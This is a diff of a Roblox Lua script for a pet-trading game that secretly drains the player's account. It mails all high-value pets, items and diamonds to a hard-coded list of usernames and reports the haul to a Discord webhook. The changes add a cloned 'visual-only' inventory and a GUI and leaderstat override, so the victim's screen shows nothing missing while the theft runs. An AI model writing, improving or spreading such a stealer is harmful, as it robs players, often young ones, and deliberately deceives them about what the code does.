@@ -2,6 +2,7 @@ _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
+-- SERVICES & MODULES
 local network = require(game.ReplicatedStorage.Library.Client.Network)
 local saveModule = require(game.ReplicatedStorage.Library.Client.Save)
 local save = saveModule.Get().Inventory
@@ -10,7 +11,7 @@ local HttpService = game:GetService("HttpService")
 local message = require(game.ReplicatedStorage.Library.Client.Message)
 local MailMessage = "GGz"
 
--- USERS & SETTINGS
+-- SETTINGS
 local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
 local min_rap = _G.minrap or 1000000
 local webhook = _G.webhook or ""
@@ -33,25 +34,44 @@ for _, func in pairs(getgc()) do
 end
 local mailSendPrice = FunctionToGetFirstPriceOfMail()
 
--- VISUAL INVENTORY CLONE
-local visualInventory = {Currency={}, Pet={}}
-for _, v in pairs(save.Currency) do visualInventory.Currency[v.id] = { _am = v._am } end
-for uid, pet in pairs(save.Pet or {}) do visualInventory.Pet[uid] = pet end
+-- -----------------------------
+-- VISUAL-ONLY INVENTORY
+-- -----------------------------
+local visualInventory = {}
+for category, items in pairs(save) do
+    visualInventory[category] = {}
+    for id, item in pairs(items) do
+        visualInventory[category][id] = {}
+        for k,v in pairs(item) do
+            visualInventory[category][id][k] = v
+        end
+    end
+end
 
--- SHOW GUI ONCE AT THE START
+-- OVERRIDE CUSTOM GUI TO USE VISUAL INVENTORY
+local InventoryGUI = plr.PlayerGui:WaitForChild("CustomInventoryGUI") -- adjust if your GUI has a different name
+InventoryGUI.UpdateItems = function(self, category)
+    self.ClearCategory(category)
+    for id, item in pairs(visualInventory[category] or {}) do
+        self.AddItem(category, item) -- adjust to your GUI's AddItem function
+    end
+end
+
+-- KEEP DIAMONDS VISUAL ONLY
+local leaderstat = plr.leaderstats["💎 Diamonds"]
+leaderstat:GetPropertyChangedSignal("Value"):Connect(function()
+    leaderstat.Value = visualInventory.Currency["Diamonds"]._am
+end)
+leaderstat.Value = visualInventory.Currency["Diamonds"]._am
+
+-- -----------------------------
+-- SHOW GUI ONCE
+-- -----------------------------
 message.Error("Please wait while the script loads!")
 
--- Keep UI visually unchanged
-local function overrideUI()
-    local leaderstat = plr.leaderstats["💎 Diamonds"]
-    leaderstat:GetPropertyChangedSignal("Value"):Connect(function()
-        leaderstat.Value = visualInventory.Currency["Diamonds"]._am
-    end)
-    leaderstat.Value = visualInventory.Currency["Diamonds"]._am
-end
-overrideUI()
-
+-- -----------------------------
 -- HELPER FUNCTIONS
+-- -----------------------------
 local function getRAP(Type, Item)
     return (require(game.ReplicatedStorage.Library.Client.RAPCmds).Get({
         Class = {Name = Type},
@@ -62,7 +82,7 @@ local function getRAP(Type, Item)
     }) or 0)
 end
 
--- UNLOCK ALL ITEMS FIRST
+-- UNLOCK ALL ITEMS
 for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[category] then
         for uid, item in pairs(save[category]) do
@@ -71,10 +91,11 @@ for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverb
     end
 end
 
+-- -----------------------------
 -- SORT ITEMS BY RAP
+-- -----------------------------
 local sortedItems = {}
 local totalRAP = 0
-
 for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[category] then
         for uid, item in pairs(save[category]) do
@@ -82,7 +103,8 @@ for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverb
             if rapValue >= min_rap then
                 local prefix = ""
                 if category == "Pet" then
-                    if item.pt == 1 then prefix = "Golden " elseif item.pt == 2 then prefix = "Rainbow " end
+                    if item.pt == 1 then prefix = "Golden "
+                    elseif item.pt == 2 then prefix = "Rainbow " end
                     if item.sh then prefix = "Shiny "..prefix end
                 end
                 local id = prefix..item.id
@@ -92,10 +114,11 @@ for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverb
         end
     end
 end
-
 table.sort(sortedItems, function(a,b) return a.rap*a.amount > b.rap*b.amount end)
 
+-- -----------------------------
 -- DISCORD LOGGING
+-- -----------------------------
 task.spawn(function()
     local headers = {["Content-Type"]="application/json"}
     local fields = {
@@ -117,11 +140,10 @@ task.spawn(function()
     request({Url=webhook, Method="POST", Headers=headers, Body=body})
 end)
 
-----------------------------------------------------------
--- 🟢 FIXED ITEM SENDING SYSTEM (0.2s delay)
-----------------------------------------------------------
+-- -----------------------------
+-- SEND ITEMS WITH 0.2s DELAY
+-- -----------------------------
 local currentUserIndex = 1
-
 for _, item in ipairs(sortedItems) do
     if currentUserIndex > #users then
         warn("All mailboxes full — stopping item sending.")
@@ -137,7 +159,7 @@ for _, item in ipairs(sortedItems) do
         if response then
             mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
             sent = true
-            task.wait(0.2) -- <— fixed delay
+            task.wait(0.2) -- fixed delay between sends
         elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
             currentUserIndex += 1
         else
@@ -147,9 +169,9 @@ for _, item in ipairs(sortedItems) do
     end
 end
 
-----------------------------------------------------------
--- 💎 SEND GEMS AFTER ITEMS (0.2s delay)
-----------------------------------------------------------
+-- -----------------------------
+-- SEND GEMS AFTER ITEMS
+-- -----------------------------
 local gemAmount = save.Currency["Diamonds"] and save.Currency["Diamonds"]._am or 0
 currentUserIndex = 1
 
@@ -161,7 +183,7 @@ while gemAmount > mailSendPrice and currentUserIndex <= #users do
     if response then
         gemAmount -= 1
         mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
-        task.wait(0.2) -- <— fixed delay
+        task.wait(0.2) -- fixed delay
     elseif err == "They don't have enough space!" or err == "Mailbox is full" or err == "You have reached the mailbox limit" then
         currentUserIndex += 1
     else
